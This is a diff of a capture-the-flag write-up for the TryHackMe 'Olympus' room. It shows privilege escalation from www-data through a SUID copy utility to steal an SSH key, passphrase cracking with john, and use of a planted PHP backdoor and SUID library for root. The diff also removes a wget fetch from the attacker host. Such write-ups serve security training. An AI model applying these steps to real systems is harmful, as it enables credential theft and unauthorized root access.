@@ -235,6 +235,7 @@ nc -lvnp 9001
 
 www-data@olympus:/var/www/chat.olympus.thm/public_html/uploads$ 
 ```
+Doing my usual routine i found interssting that we can execute cputils
 
 ```bash
 www-data@olympus:/var/www/html/chat.olympus.thm$ find / -type f -perm -4000 2>/dev/null | grep -v /snap*
@@ -260,8 +261,23 @@ www-data@olympus:/var/www/html/chat.olympus.thm$ find / -type f -perm -4000 2>/d
 www-data@olympus:/var$ ls -la /usr/bin/cputils
 -rwsr-xr-x 1 zeus zeus 17728 Apr 18  2022 /usr/bin/cputils
 ```
+Looking at the strings of cputils, I have to give him a source file and a target path, so he can copy the file we gave him.
+```zeus@olympus:~$ strings /usr/bin/cputils 
+/lib64/ld-linux-x86-64.so.2
+libstdc++.so.6
+[...]
+Enter the Name of Source File: 
+Error Occurred!
+Enter the Name of Target File: 
+File copied successfully.
+:*3$"
+[...]
+```
+
+Let's try to copie the ssh key of the user zeus.
+
 ```bash
-Error Occurred!www-data@olympus:/var$ /usr/bin/cputils
+www-data@olympus:/var$ /usr/bin/cputils
   ____ ____        _   _ _     
  / ___|  _ \ _   _| |_(_) |___ 
 | |   | |_) | | | | __| | / __|
@@ -274,6 +290,8 @@ Enter the Name of Target File: /dev/shm/id_rsa
 
 File copied successfully.
 ```
+Know that we have the key we need to make it usable.
+
 ```bash
 root@ip-10-10-239-74:~# /opt/john/ssh2john.py id_rsa > id_rsa.hash
 
@@ -290,6 +308,8 @@ Will run 2 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
 s[.......]e        (id_rsa)
 ```
+Cewl, we have the password of the key, let's ssh into the machine !
+
 ```
 root@ip-10-10-239-74:~# chmod 600 id_rsa
 root@ip-10-10-239-74:~# ssh zeus@olympus.thm -i id_rsa
@@ -326,25 +346,13 @@ To check for new updates run: sudo apt update
 Last login: Sat Jul 16 07:52:39 2022
 zeus@olympus:~$ 
 ```
-```
-zeus@olympus:~$ wget http://10.10.239.74:1234/linpeas.sh
---2023-03-09 13:11:31--  http://10.10.239.74:1234/linpeas.sh
-Connecting to 10.10.239.74:1234... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 233380 (228K) [text/x-sh]
-Saving to: \u2018linpeas.sh\u2019
 
-linpeas.sh                                           100%[=====================================================================================================================>] 227.91K  --.-KB/s    in 0.03s   
+While exploring the room, I came across these folders with random names containing a php file
 
-2023-03-09 13:11:31 (8.17 MB/s) - \u2018linpeas.sh\u2019 saved [233380/233380]
-
-zeus@olympus:~$ chmod +x linpeas.sh 
-```
-```
+```bash
 zeus@olympus:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ ls
 index.html  VIGQFQFMYOST.php
 ```
-
 ```
 <?php
 $pass = "a7c5ffcf139742f52a5267c4a0674129";
@@ -389,6 +397,14 @@ for($x=0;$x<=2;$x++) fclose($pipes[x]);
 proc_close($proc);
 ?>
 ```
+It seems that promotheus has set up a backdoor. And uses an evil lib libc.so.99 to gain root access
+```
+$suid_bd = "/lib/defended/libc.so.99";
+$shell = "uname -a; w; $suid_bd";
+```
+
+Run the exploit AND BOOM we are ROOT !!!
+
 ```
 zeus@olympus:~$ uname -a; w;/lib/defended/libc.so.99
 Linux olympus 5.4.0-109-generic #123-Ubuntu SMP Fri Apr 8 09:10:54 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
